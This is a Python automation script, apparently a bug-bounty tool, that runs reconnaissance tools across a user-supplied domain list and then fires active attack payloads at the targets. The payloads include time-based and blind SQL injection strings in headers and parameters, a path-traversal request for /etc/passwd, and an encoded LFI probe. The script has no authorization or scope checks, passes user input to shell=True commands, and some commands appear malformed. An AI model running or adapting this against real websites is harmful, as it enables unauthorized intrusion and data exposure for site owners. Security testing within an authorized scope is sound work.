import subprocess
import os

def print_banner():
    banner = r"""
    ________    _______  ___________         .____    .___ _______  _____________________ 
    \_____  \   \      \ \_   _____/         |    |   |   |\      \ \_   _____/\______   \
    /    |   \  /   |   \ |    __)_   ______ |    |   |   |/   |   \ |    __)_  |       _/
    /    |    \/    |    \|        \ /_____/ |    |___|   /    |    \|        \ |    |   \
    \_______  /\____|__  /_______  /         |_______ \___\____|__  /_______  / |____|_  /
            \/         \/        \/                  \/           \/        \/         \/ 
    """
    print(banner)

def run_command(command, input_data=None):
    try:
        if input_data:
            output = subprocess.check_output(command, input=input_data, shell=True).decode()
        else:
            output = subprocess.check_output(command, shell=True).decode()
        return output
    except subprocess.CalledProcessError as e:
        print(f"[-] Error: An error occurred while running {command}: {e}")
        return ""

def write_output(filename, data):
    with open(filename, "w") as f:
        f.write(data)

def perform_scan(step_name, command, output_file, input_data=None):
    print(f"##########################################################")
    print(f"[+] {step_name} Started...")
    print(f"##########################################################")
    output = run_command(command, input_data)
    write_output(output_file, output)
    print(f"##########################################################")
    print(f"[+] {step_name} Completed.")
    print(f"##########################################################")
    return output

print_banner()

liste = input("Please enter the name of the domain file: ")

dork = input("Enter Dork Links List (optional, you can leave it blank): ")

# Subdomain finding
subdomains = perform_scan("Subdomain Finding", f"subfinder -dL {liste} -o domain.txt", "domain.txt").splitlines()

# Wayback URLs and parameter extraction
parameters = []
for subdomain in subdomains:
    wayback_output = perform_scan(f"Wayback URLs Extraction ({subdomain})", f"waybackurls {subdomain}", "wayback.txt")
    for line in wayback_output.splitlines():
        if "?" in line:
            parameters.append(line)

# Adding dork links if provided
if dork:
    with open(dork, "r") as f:
        parameters.extend(f.readlines())

write_output("parameters.txt", "\n".join(parameters))

# HTTPX scan
perform_scan("HTTPX Scan", "httpx -l domain.txt -o httpx.txt", "httpx.txt")

# General URL extraction (GAU)
gau_output = perform_scan("GAU Extraction", f"gau --threads 5 {' '.join(subdomains)}", "Endpoints.txt")

# XSS Control 1
katana_output = perform_scan("Katana Scan", "katana -jc -l httpx.txt", "Endpoints.txt")
uro_output = perform_scan("URO Processing", "uro", "Endpoints_F.txt", input_data=(gau_output + katana_output).encode())
gf_output = perform_scan("GF XSS Scan", "gf xss", "XSS.txt", input_data=uro_output.encode())
perform_scan("Gxss Scan", "Gxss -p khXSS -o XSS_Ref.txt", "Gxss.txt", input_data=gf_output.encode())

# SQL Injection Scan 2
sql1_output = perform_scan("SQL Injection Scan 2", "httpx -silent -mc 'You have an error in your SQL syntax'", "sql1.txt", input_data="\n".join(parameters).encode())

# Fuzzing Control
perform_scan("Fuzzing Control", "nuclei -l parameters.txt -t fuzzing-templates -o FUZZRapor.txt", "FUZZRapor.txt")

# Template Control
perform_scan("Template Control", "nuclei -l parameters.txt -t nuclei-templates -o Nuclei.txt", "Nuclei.txt")

# SQL Injection Scan 3
sql3_output = perform_scan("SQL Injection Scan 3", "httpx -silent -H 'X-Forwarded-For: XOR(if (now()=sysdate(), sleep (13),0))OR' -rt -timeout 20 -mrt '>13' -o sql3.txt", "sql3.txt", input_data="\n".join(parameters).encode())

# HTTP API Control
perform_scan("HTTP API Control", "httpx -silent -o public.txt | grep -E '/api/index.php/v1/config/application?public=true' | httpx -silent -mc 200 -o public.txt", "public.txt")

# LFI Check
perform_scan("LFI Check", "httpx -l domain.txt -path '/assets/built%2F..%2F..%2Fpackage.json' -status-code -mc 200 -o lfi.txt", "lfi.txt")

# XSS Control 2
xss2_output = perform_scan("XSS Control 2", "getJS | httpx --match-regex 'addEventListener\\((?:\\'|\\\")(message)(?:\\'|\\\")' -silent", "xss2.txt")

# SQL Injection Scan 5
sql5_output = perform_scan("SQL Injection Scan 5", "httpx -silent -H 'X-Forwarded-For: ; waitfor delay ''0:0:6'' -- ' -rt -timeout 20 -mrt '>13' -o sql5.txt", "sql5.txt", input_data="\n".join(parameters).encode())

# Parameters HTTP Filter
parameters_http_output = perform_scan("Parameters HTTP Filter", "grep -v -e 'js' -e 'css' -e 'svg' -e 'png' -e 'jpg' -e 'eot' -e 'ttf' -e 'woff' httpx -mc 200 -silent", "parameters_http.txt", input_data="\n".join(parameters).encode())

# SQL Injection Scan 6
sql6_output = perform_scan("SQL Injection Scan 6", "parallel -j50 httpx --silent -H 'X-Forwarded-For: XOR(if (now()=sysdate(), sleep (13),0))OR' -rt -timeout 20 -mrt '>13'", "sql6.txt", input_data=parameters_http_output.encode())

# Path Traversal Control
perform_scan("Path Traversal Control", "httpx -l parameters.txt -path '///////../../../../../../etc/passwd' -status-code -mc 200 -ms 'root:' -o path_traversal.txt", "path_traversal.txt")

# Gospider Control
gospider_output = perform_scan("Gospider Control", "gospider -S httpx_results.txt -c 10 -d 5 --blacklist '.*(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)' --other-source", "result.txt")

# Blind SQL Injection Scan
blindsqli_output = perform_scan("Blind SQL Injection Scan", "grep '=' parameters.txt | qsreplace '1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)'", "blindsqli.txt")

# XSS Control 3
xss3_output = perform_scan("XSS Control 3", "getJS | httpx --match-regex 'addEventListener\\((?:\\'|\\\")(message)(?:\\'|\\\")' -silent", "xss3.txt")

# Additional command integration
additional_scan_command = "cat parameters.txt | sed 's/=/=(CASE%20WHEN%20888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e \"\\ntarget : {}\\n\" && time curl \"{}\"'"
additional_scan_output = run_command(additional_scan_command)
write_output("additional_scan.txt", additional_scan_output)

# Collect all results
tasks = [
    ("SQL Injection Scan Results", "sql1.txt"),
    ("Fuzzing Control Results", "FUZZRapor.txt"),
    ("Template Check Results", "Nuclei.txt"),
    ("SQL Injection Scan Results", "sql3.txt"),
    ("HTTP API Check Results", "public.txt"),
    ("LFI Check Results", "lfi.txt"),
    ("XSS Check 2 Results", "xss2.txt"),
    ("SQL Injection Scan Results", "sql5.txt"),
    ("SQL Injection Scan Results", "sql6.txt"),
    ("Blind SQL Injection Scan Results", "blindsqli.txt"),
    ("Path Traversal Check Results", "path_traversal.txt"),
    ("Gospider Control Results", "result.txt"),
    ("XSS Check 3 Results", "xss3.txt"),
    ("Additional Scan Results", "additional_scan.txt")
]

with open("all_result.txt", "w") as f:
    for task_name, task_file in tasks:
        f.write("##########################################################\n")
        f.write(f"[+] {task_name}:\n")
        f.write("##########################################################\n")
        with open(task_file, "r") as t:
            f.write(t.read() + "\n\n")

print("[+] All tasks completed successfully. Results are stored in 'all_result.txt'.")

